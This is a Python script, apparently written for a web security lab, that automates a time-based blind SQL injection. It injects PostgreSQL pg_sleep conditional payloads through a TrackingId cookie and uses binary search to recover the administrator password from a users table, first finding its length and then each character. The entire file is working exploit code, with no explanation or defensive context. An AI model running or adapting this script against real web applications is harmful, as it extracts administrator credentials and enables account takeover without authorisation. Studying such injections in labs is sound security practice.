import requests
import time

url = input("Enter the url with a category: ")
trackingID = input("Enter the tracking ID: ")
sessionID = input("Enter session ID: ")

s = requests.Session()

def check(payload):
    start = time.time()
    Tracking_ID = trackingID + payload
    cookies = {"TrackingId" : Tracking_ID, "Session" : sessionID}
    s.get(url, cookies=cookies)
    elapsed = time.time() - start
    return elapsed > 2

def find_length():
    low = 0
    high = 50
    while low < high:
        mid = low + (high - low) // 2
        payload = f"'||(CASE WHEN (LENGTH((SELECT password from users where username='administrator')) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)||'"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return high

def find_password(length):
    password = ""

    for i in range(1,length+1):
        low = 48
        high = 122
        while (low < high):
            mid = low + (high - low) // 2
            payload = f"'||(CASE WHEN (ASCII(SUBSTR((SELECT password FROM users where username='administrator'), {i}, 1)) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)||'"
            if check(payload):
                low = mid + 1
            else:
                high = mid
        password += chr(high)
        print(f"[+] Position {i}: {chr(high)} → {password}")
    return password


if __name__ == "__main__":
    print("Finding password length...")
    length = find_length()
    print(f"Length of password: {length}")
    print("Finding password...")
    password = find_password(length)
    print(f"Password: {password}")